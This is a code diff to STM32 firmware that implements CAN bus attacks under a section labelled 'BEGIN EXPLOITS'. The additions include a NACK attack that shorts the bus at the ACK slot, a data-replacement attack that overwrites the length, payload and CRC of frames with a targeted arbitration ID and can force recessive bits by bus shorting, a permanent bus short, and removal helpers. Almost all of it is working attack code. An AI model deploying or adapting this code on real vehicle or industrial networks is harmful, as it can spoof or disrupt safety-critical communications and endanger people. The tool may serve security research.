@@ -9,6 +9,9 @@
 #include <stdbool.h>
 #include "usart.h"
 
+#define SHORT_ON GPIOA->ODR |= GPIO_PIN_5
+#define SHORT_OFF GPIOA->ODR &= ~GPIO_PIN_5
+
 void (*timer4_callback_handler)(void) = NULL;
 void (*timer3_callback_handler)(void) = NULL;
 void (*end_of_frame_callback)(void) = NULL;
@@ -42,11 +45,16 @@ static uint8_t data_replacer_len = 0;
 static uint8_t data_replacer_len_bits = 0;
 static uint8_t data_replacer_data[8];
 static uint16_t data_replacer_crc;
+static uint8_t data_replacer_force_recessive = 0;
 
 static uint32_t overload_frame_count = 0;
 static volatile uint32_t overload_frames_sent = 0;
 static volatile uint32_t overload_frame_bit_counter = 0;
 static volatile uint32_t overload_frame_first_recessive_bit = 0;
+
+inline static void short_on();
+inline static void short_off();
+static uint8_t nack_attack = 0;
 
 const uint32_t TIMER_PERIOD_NS = 50;
 
@@ -400,6 +408,19 @@ static void sample_callback(void)
                     same_bits_count = 0;
                 }
             }
+            else if(bits_read == (35 + (8 * msg_len))) // This is the CRC Delimiter
+            {
+                if(nack_attack > 0)
+                    timer3_callback_handler = short_on;
+            }
+            else if(bits_read == (36 + (8 * msg_len))) // This is the ACK slot
+            {
+                if(nack_attack > 0)
+                    timer3_callback_handler = short_off;
+            }
+            // else if(bits_read == (37 + (8 * msg_len))) // This is the ACK Delimiter
+            // else if((bits_read >= (38 + (8 * msg_len))) && (bits_read < (45 + (8 * msg_len)))) // End Of Frame bits
+            // else if((bits_read >= (45 + (8 * msg_len))) && (bits_read < (48 + (8 * msg_len)))) // Inter Frame Segment TODO: Not presently accounting for overload frames
         }
         else if (bits_read > 14)
         {
@@ -433,11 +454,24 @@ static void sample_callback(void)
                     same_bits_count = 0;
                 }
             }
+            else if(bits_read == (55 + (8 * msg_len))) // This is the CRC Delimiter
+            {
+                if(nack_attack > 0)
+                    timer3_callback_handler = short_on;
+            }
+            else if(bits_read == (56 + (8 * msg_len))) // This is the ACK slot
+            {
+                if(nack_attack > 0)
+                    timer3_callback_handler = short_off;
+            }
+            // else if(bits_read == (57 + (8 * msg_len))) // This is the ACK Delimiter
+            // else if((bits_read >= (58 + (8 * msg_len))) && (bits_read < (65 + (8 * msg_len)))) // End Of Frame bits
+            // else if((bits_read >= (65 + (8 * msg_len))) && (bits_read < (68 + (8 * msg_len)))) // Inter Frame Segment TODO: Not presently accounting for overload frames
         }
     }
-    /* Currently skipping the last 3 bits of CRC Delimiter and ACK slots */
-    if((extended_arbid == 0 && bits_read >= (20 + 17 + (8 * msg_len))) ||
-       (extended_arbid == 1 && bits_read >= (40 + 17 + (8 * msg_len))))
+    /* Currently skipping the EOF Header */
+    if((extended_arbid == 0 && bits_read >= (20 + 18 + (8 * msg_len))) ||
+       (extended_arbid == 1 && bits_read >= (40 + 18 + (8 * msg_len))))
     {
         can_timer_stop();
         // Enable the external interrupt on the RX pin
@@ -459,6 +493,7 @@ static void sample_callback(void)
     }
 }
 
+/* Stops the timer4 timer */
 void can_timer_stop()
 {
     /* Disable the overflow interrupt and timer */
@@ -479,19 +514,16 @@ void TIM3_IRQHandler(void)
 
 void TIM4_IRQHandler(void)
 {
-GPIOA->ODR |= GPIO_PIN_15;
     TIM4->SR = ~TIM_IT_UPDATE;
     TIM4->ARR = can_ticks_per_cycle;
     if(timer4_callback_handler != NULL)
     {
         timer4_callback_handler();
     }
-GPIOA->ODR &= ~GPIO_PIN_15;
 }
 
 void EXTI15_10_IRQHandler(void)
 {
-GPIOA->ODR |= GPIO_PIN_4;
     __HAL_GPIO_EXTI_CLEAR_IT(GPIO_PIN_12); // Clear any pending interrupt
 
     HAL_NVIC_DisableIRQ(EXTI15_10_IRQn);
@@ -510,7 +542,7 @@ GPIOA->ODR |= GPIO_PIN_4;
     TIM4->DIER |= TIM_IT_UPDATE;
     TIM4->CR1 |= TIM_CR1_CEN;
 
-    /* Start the timer that fires on each CAN edge */
+    /* Restarts the timer that fires on each CAN edge */
     TIM3->CR1 &= ~TIM_CR1_CEN;
     TIM3->SR = ~TIM_IT_UPDATE;
     TIM3->DIER &= ~TIM_IT_UPDATE;
@@ -521,11 +553,12 @@ GPIOA->ODR |= GPIO_PIN_4;
     TIM3->CR1 |= TIM_CR1_CEN;
 
     /* Set the ARR back to the correct value */
-GPIOA->ODR &= ~GPIO_PIN_4;
 }
 
 void setCanBaudrate(long int baud)
 {
+    __HAL_GPIO_EXTI_CLEAR_IT(GPIO_PIN_12); // Clear any pending interrupt
+    HAL_NVIC_DisableIRQ(EXTI15_10_IRQn);
     can_baud = baud;
     can_ticks_per_cycle = ((1000000000 / can_baud) / TIMER_PERIOD_NS) - 1;
 
@@ -543,10 +576,6 @@ void setCanBaudrate(long int baud)
  * BEGIN EXPLOITS
  *
  */
-void remove_attack()
-{
-    timer3_callback_handler = NULL;
-}
 
 static void arbid_killer()
 {
@@ -603,6 +632,11 @@ void install_arbid_killer()
     timer3_callback_handler = arbid_killer;
 }
 
+void uninstall_arbid_killer()
+{
+    timer3_callback_handler = NULL;
+}
+
 static void data_replacer()
 {
     uint8_t bit = 1;
@@ -617,29 +651,31 @@ static void data_replacer()
      */
 
     /* Check to see if we have received an arbitration ID and it matches the one we are attacking */
-    if((bits_read >= 12) && (arbid == attack_arbid))
+    if((bits_read >= 15) && (arbid == attack_arbid))
     {
         /* Check to see if we need to send a stuff bit */
         if(same_bits_count == 5)
         {
             bit = last_bit ^ 0x01;
+            bit <<= data_replacer_force_recessive; // Set bit to two if we are forcing the recessive and transmitting a 1
         }
         /* Let the current transmitter send the RTR, IDE and reserved bits, then take over at the DLC */
         else if(bits_read >= 15 && bits_read <= 18)
         {
-GPIOA->ODR |= GPIO_PIN_5;
             bit = (data_replacer_len >> (18 - bits_read)) & 0x1;
-GPIOA->ODR &= ~GPIO_PIN_5;
+            bit <<= data_replacer_force_recessive; // Set bit to two if we are forcing the recessive and transmitting a 1
         }
         /* Send the data */
         else if((bits_read >= 19) && (bits_read < (19 + data_replacer_len_bits)))
         {
-            bit = data_replacer_data[(bits_read - 19) >> 3] >> (7 - ((bits_read - 19) & 0x7));
+            bit = (data_replacer_data[(bits_read - 19) >> 3] >> (7 - ((bits_read - 19) & 0x7))) & 0x01;
+            bit <<= data_replacer_force_recessive; // Set bit to two if we are forcing the recessive and transmitting a 1
         }
         /* Send the CRC */
         else if((bits_read >= (19 + data_replacer_len_bits)) && (bits_read < (34 + data_replacer_len_bits)))
         {
             bit = (data_replacer_crc >> (33 + data_replacer_len_bits - bits_read)) & 0x1;
+            bit <<= data_replacer_force_recessive; // Set bit to two if we are forcing the recessive and transmitting a 1
         }
         /* Send the CRC delimiter, ACK slot, ACK delimiter, and EOF */
         else if(bits_read >= 34 + data_replacer_len_bits)
@@ -649,10 +685,21 @@ GPIOA->ODR &= ~GPIO_PIN_5;
 
         /* Set the calculated level */
         if(bit == 1)
+        {
             GPIOB->ODR |= GPIO_PIN_13;
+            SHORT_OFF;
+        }
+        else if(bit == 2)
+        {
+            GPIOB->ODR |= GPIO_PIN_13;
+            SHORT_ON;
+        }
         else
+        {
             GPIOB->ODR &= ~GPIO_PIN_13;
-     }
+            SHORT_OFF;
+        }
+    }
 }
 
 void install_data_replacer()
@@ -674,6 +721,14 @@ void install_data_replacer()
         data_replacer_data[i] = read_hex() & 0xFF;
     }
 
+    write_string("Force Recessive bits? (y/N) ");
+    data_replacer_force_recessive = read_char();
+
+    if(data_replacer_force_recessive == 'y' || data_replacer_force_recessive == 'Y')
+        data_replacer_force_recessive = 1;
+    else
+        data_replacer_force_recessive = 0;
+
     data_replacer_crc = can_crc(attack_arbid, 0, 0, data_replacer_len, data_replacer_data);
 
     write_string("Replacing Arbid 0x");
@@ -687,8 +742,27 @@ void install_data_replacer()
     write_string(" CRC: 0x");
     write_int(data_replacer_crc);
     write_string("\r\n");
+
+    if(data_replacer_force_recessive > 0)
+        write_string("Recessive Bits will be forced through bus shorting\r\n");
  
     timer3_callback_handler = data_replacer;
+}
+
+void uninstall_data_replacer()
+{
+    data_replacer_len = 0;
+    data_replacer_len_bits = 0;
+
+    for(int i = 0; i < 8; i++)
+    {
+        data_replacer_data[i] = 0;
+    }
+
+    data_replacer_force_recessive = 0;
+    data_replacer_crc = 0;
+
+    timer3_callback_handler = NULL;
 }
 
 void overload_frame()
@@ -750,4 +824,41 @@ void install_overload_frame()
     overload_frame_count = read_int();
     end_of_frame_callback = overload_frame_eof;
 }
+
+void uninstall_overload_frame()
+{
+    overload_frame_count = 0;
+    end_of_frame_callback = NULL;
+}
+
+void install_bus_short()
+{
+    SHORT_ON;
+}
+
+inline static void short_on()
+{
+    SHORT_ON;
+}
+
+inline static void short_off()
+{
+    SHORT_OFF;
+}
+
+void install_nack_attack()
+{
+    nack_attack = 1;
+}
+
+/* Calls all of the attack removal functions */
+void remove_attack()
+{
+    uninstall_arbid_killer();
+    uninstall_data_replacer();
+    uninstall_overload_frame();
+    SHORT_OFF;
+    nack_attack = 0;
+}
+
 
